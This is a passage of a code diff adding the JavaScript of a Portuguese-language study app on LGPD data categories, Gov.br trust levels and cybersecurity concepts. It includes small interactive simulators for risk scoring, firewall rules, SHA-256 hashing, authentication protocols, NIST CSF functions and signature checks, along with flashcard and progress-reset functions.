+        'biometria': '<strong class="text-rose-400">Dado Pessoal Sensível (Art. 5º, II):</strong> Exige proteção reforçada e bases legais mais restritas (Art. 11), como consentimento específico e destacado ou prevenção à fraude.',
+        'cpf': '<strong class="text-cyan-400">Dado Pessoal Comum (Art. 5º, I):</strong> Identifica diretamente uma pessoa natural; sujeito às 10 bases legais do Art. 7º.',
+        'anon': '<strong class="text-emerald-400">Dado Anonimizado (Art. 12):</strong> Não é considerado dado pessoal pela LGPD, desde que o processo de anonimização não possa ser revertido com esforços razoáveis.'
+      };
+      out.innerHTML = map[type];
+    }
+
+    function simGovLevel(lvl) {
+      const out = document.getElementById('gov-sim-out');
+      const map = {
+        'BRONZE': '<strong class="text-amber-400">Nível Bronze:</strong> Acesso básico aos serviços digitais. <em>Não permite</em> assinatura eletrônica gratuita no portal.',
+        'PRATA': '<strong class="text-slate-200">Nível Prata:</strong> Alta segurança. Libera assinatura eletrônica avançada Gov.br e acesso a serviços sensíveis.',
+        'OURO': '<strong class="text-yellow-400">Nível Ouro:</strong> Nível máximo de confiabilidade. Libera todos os serviços públicos digitais e assinatura eletrônica avançada.'
+      };
+      out.innerHTML = map[lvl];
+    }
+
+    function showCodeLang(lang) {
+      const out = document.getElementById('code-comp-out');
+      const codes = {
+        'Python': `# Python (Tipagem Dinâmica, Indentação)\ndef verificar_acesso(nivel: int) -> str:\n    if nivel >= 3:\n        return "Acesso Autorizado"\n    return "Acesso Negado"`,
+        'Java': `// Java (Tipagem Estática, JVM)\npublic class ControleAcesso {\n    public static String verificarAcesso(int nivel) {\n        return (nivel >= 3) ? "Acesso Autorizado" : "Acesso Negado";\n    }\n}`,
+        'C#': `// C# (.NET CLR, Tipagem Estática)\npublic class ControleAcesso {\n    public static string VerificarAcesso(int nivel) {\n        return nivel >= 3 ? "Acesso Autorizado" : "Acesso Negado";\n    }\n}`,
+        'Apex': `// Apex (Salesforce Cloud, sintaxe estilo Java)\npublic with sharing class ControleAcesso {\n    public static String verificarAcesso(Integer nivel) {\n        return (nivel >= 3) ? 'Acesso Autorizado' : 'Acesso Negado';\n    }\n}`
+      };
+      out.textContent = codes[lang];
+    }
+
+    function simCid(pilar) {
+      const out = document.getElementById('cid-sim-out');
+      const map = {
+        'C': '<strong class="text-cyan-400">Violação de CONFIDENCIALIDADE:</strong> Pessoas não autorizadas obtiveram acesso a informações sigilosas.',
+        'I': '<strong class="text-emerald-400">Violação de INTEGRIDADE:</strong> A exatidão e confiabilidade do dado foram adulteradas indevidamente.',
+        'D': '<strong class="text-amber-400">Violação de DISPONIBILIDADE:</strong> Usuários legítimos ficaram impedidos de acessar o serviço.'
+      };
+      out.innerHTML = map[pilar];
+    }
+
+    function calcRiskSim() {
+      const p = parseInt(document.getElementById('risk-prob').value, 10);
+      const i = parseInt(document.getElementById('risk-imp').value, 10);
+      const score = p * i;
+      const out = document.getElementById('risk-sim-out');
+      if (score >= 15) {
+        out.className = 'p-3 rounded-xl bg-rose-500/15 border border-rose-500/40 text-xs text-rose-200 font-semibold';
+        out.textContent = `Nível de Risco: ${score} / 25 (CRÍTICO) — Ação recomendada: Mitigação imediata com controles técnicos prioritários.`;
+      } else if (score >= 8) {
+        out.className = 'p-3 rounded-xl bg-amber-500/15 border border-amber-500/40 text-xs text-amber-200 font-semibold';
+        out.textContent = `Nível de Risco: ${score} / 25 (MODERADO) — Ação recomendada: Planejar mitigação ou transferência de risco.`;
+      } else {
+        out.className = 'p-3 rounded-xl bg-emerald-500/15 border border-emerald-500/40 text-xs text-emerald-200 font-semibold';
+        out.textContent = `Nível de Risco: ${score} / 25 (BAIXO) — Risco dentro do apetite organizacional (pode ser aceito e monitorado).`;
+      }
+    }
+
+    function simFirewall(rule) {
+      const out = document.getElementById('fw-sim-out');
+      const map = {
+        'HTTPS': '✅ PERMIT (ALLOW): Tráfego HTTPS (porta 443) de entrada permitido apenas para o IP do Servidor Web na DMZ.',
+        'RDP': '🛑 DENY (DROP): Conexões RDP (3389) diretas da Internet são bloqueadas. Acesso administrativo exige VPN + MFA.',
+        'TELNET': '🛑 DENY (DROP): Protocolo Telnet (23) trafega credenciais em texto claro. Substituir por SSH (porta 22).'
+      };
+      out.textContent = map[rule];
+    }
+
+    async function computeSHA256Lab(text) {
+      const out = document.getElementById('sha256-output');
+      if (!out) return;
+      try {
+        const encoder = new TextEncoder();
+        const data = encoder.encode(text);
+        const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+        const hashArray = Array.from(new Uint8Array(hashBuffer));
+        const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+        out.textContent = hashHex;
+      } catch (e) {
+        out.textContent = 'SHA-256 indisponível neste contexto.';
+      }
+    }
+
+    function fixCspmBucket() {
+      const box = document.getElementById('cspm-box');
+      box.className = 'p-4 rounded-xl bg-emerald-500/10 border border-emerald-500/40 text-xs text-emerald-200';
+      box.innerHTML = '<strong>✓ Remediado com Sucesso!</strong> "Block Public Access" ativado, criptografia padrão AES-256 (KMS) habilitada e logs de acesso registrados.';
+    }
+
+    function simAuthProto(p) {
+      const out = document.getElementById('auth-sim-out');
+      const map = {
+        'SAML': '<strong class="text-cyan-400">SAML 2.0:</strong> Troca asserções XML assinadas. Padrão ouro para SSO corporativo web tradicional (ex: portal RH, ERP).',
+        'OAUTH': '<strong class="text-amber-400">OAuth 2.0:</strong> Entrega um <em>Access Token</em> para autorizar um aplicativo a consumir uma API em nome do usuário sem expor sua senha.',
+        'OIDC': '<strong class="text-emerald-400">OpenID Connect (OIDC):</strong> Adiciona autenticação ao OAuth 2.0 entregando um <em>ID Token (JWT)</em> com claims do usuário.'
+      };
+      out.innerHTML = map[p];
+    }
+
+    function simSoc(tool) {
+      const out = document.getElementById('soc-sim-out');
+      const map = {
+        'SIEM': '<strong class="text-indigo-400">Solução Recomendada: SIEM</strong> — Centraliza logs heterogêneos e aplica regras de correlação para gerar alertas acionáveis no SOC.',
+        'PAM': '<strong class="text-rose-400">Solução Recomendada: PAM</strong> — Gerencia o cofre de credenciais privilegiadas, aplica rotação automática e grava sessões.',
+        'WAF': '<strong class="text-cyan-400">Solução Recomendada: WAF</strong> — Inspeciona requisições HTTP/HTTPS na Camada 7 bloqueando OWASP Top 10.'
+      };
+      out.innerHTML = map[tool];
+    }
+
+    function simNist(fn) {
+      const out = document.getElementById('nist-sim-out');
+      const map = {
+        'Govern': '<strong class="text-indigo-300">Govern (Governar):</strong> Definir estratégia, políticas de segurança, papéis e apetite a risco cibernético.',
+        'Identify': '<strong class="text-cyan-300">Identify (Identificar):</strong> Inventário de hardware/software, mapeamento de dados críticos e avaliação de riscos.',
+        'Protect': '<strong class="text-emerald-300">Protect (Proteger):</strong> Controle de acesso (MFA), conscientização, criptografia e hardening.',
+        'Detect': '<strong class="text-amber-300">Detect (Detectar):</strong> Monitoramento contínuo via SIEM, IDS e análise de anomalias.',
+        'Respond': '<strong class="text-rose-300">Respond (Responder):</strong> Execução de playbooks CSIRT, contenção e comunicação do incidente.',
+        'Recover': '<strong class="text-teal-300">Recover (Recuperar):</strong> Restauração de backups íntegros, retorno às operações normais e melhorias.'
+      };
+      out.innerHTML = map[fn];
+    }
+
+    function simSigCheck(valid) {
+      const out = document.getElementById('sig-sim-out');
+      if (valid) {
+        out.className = 'p-3 rounded-xl bg-emerald-500/15 border border-emerald-500/40 font-mono text-xs text-emerald-300';
+        out.textContent = '✓ ASSINATURA VÁLIDA: O hash decifrado com a Chave Pública ICP-Brasil corresponde exatamente ao SHA-256 do documento. Autenticidade, Integridade e Não-Repúdio confirmados.';
+      } else {
+        out.className = 'p-3 rounded-xl bg-rose-500/15 border border-rose-500/40 font-mono text-xs text-rose-300';
+        out.textContent = '✕ ASSINATURA INVÁLIDA: Divergência de Hash detectada! O documento foi modificado após ser assinado ou a chave não corresponde ao certificado.';
+      }
+    }
+
+    // =========================================================================
+    // 8. MODAL DE REVISÃO RÁPIDA (FLASHCARDS ALEATÓRIOS) & RESET
+    // =========================================================================
+    function openQuickReviewModal() {
+      const allCards = SYLLABUS.flatMap(t =>
+        t.flashcards.map(fc => ({ ...fc, topicTitle: `${t.track} • ${t.number}. ${t.title}` }))
+      );
+      const randomCard = allCards[Math.floor(Math.random() * allCards.length)];
+
+      const modal = document.getElementById('custom-modal');
+      const content = document.getElementById('custom-modal-content');
+      content.innerHTML = `
+        <div class="flex items-center justify-between mb-4">
+          <span class="px-2.5 py-1 rounded-lg bg-indigo-500/20 text-indigo-300 text-xs font-semibold">⚡ Revisão Rápida (Flashcard)</span>
+          <button onclick="closeModal()" class="text-slate-400 hover:text-white text-lg">✕</button>
+        </div>
+        <p class="text-[11px] font-mono text-cyan-400 mb-2">${randomCard.topicTitle}</p>
+        <div class="p-5 rounded-xl bg-slate-950 border border-slate-800 mb-4">
+          <p class="text-sm sm:text-base font-bold text-white mb-3">${randomCard.q}</p>
+          <div id="modal-fc-answer" class="hidden pt-3 border-t border-slate-800 text-xs sm:text-sm text-emerald-300 leading-relaxed">
+            ${randomCard.a}
+          </div>
+        </div>
+        <div class="flex items-center justify-between gap-3">
+          <button onclick="document.getElementById('modal-fc-answer').classList.remove('hidden')" class="flex-1 py-2.5 px-4 rounded-xl bg-slate-800 hover:bg-slate-700 text-xs font-semibold text-white transition">
+            Revelar Resposta
+          </button>
+          <button onclick="openQuickReviewModal()" class="flex-1 py-2.5 px-4 rounded-xl bg-cyan-500 hover:bg-cyan-400 text-xs font-bold text-slate-950 transition">
+            Próximo Card →
+          </button>
+        </div>
+      `;
+      modal.classList.remove('hidden');
+      modal.classList.add('flex');
+    }
+
+    function confirmResetProgress() {
+      const modal = document.getElementById('custom-modal');
+      const content = document.getElementById('custom-modal-content');
+      content.innerHTML = `
+        <h3 class="text-lg font-bold text-white mb-2">Resetar Progresso de Estudos?</h3>
+        <p class="text-xs sm:text-sm text-slate-300 mb-5">Isso apagará todos os módulos marcados como concluídos neste navegador. Deseja continuar?</p>
+        <div class="flex justify-end gap-3">
+          <button onclick="closeModal()" class="px-4 py-2 rounded-xl bg-slate-800 text-xs font-medium text-slate-300">Cancelar</button>
+          <button onclick="executeResetProgress()" class="px-4 py-2 rounded-xl bg-rose-500 text-xs font-bold text-white">Sim, Resetar</button>
+        </div>
+      `;
+      modal.classList.remove('hidden');
+      modal.classList.add('flex');
+    }
+
+    function executeResetProgress() {
+      appState.completedTopics = [];
+      appState.quizScores = {};
+      saveState(false);
+      closeModal();
+      showToast('Progresso reiniciado.');
+      if (appState.activeView === 'home') {
+        renderDashboard();
+      } else {
+        const topic = SYLLABUS.find(t => t.id === appState.activeView);
+        if (topic) renderTopicView(topic);
+      }
+    }
+
+    function closeModal() {
+      const modal = document.getElementById('custom-modal');
+      modal.classList.add('hidden');
+      modal.classList.remove('flex');
+    }
+
+    // =========================================================================
+    // 9. INICIALIZAÇÃO DA APLICAÇÃO
+    // =========================================================================
+    window.addEventListener('DOMContentLoaded', () => {
+      loadState();
+      updateProgressUI();
+      renderDashboard();
+    });
+  </script>
+</body>
+</html>
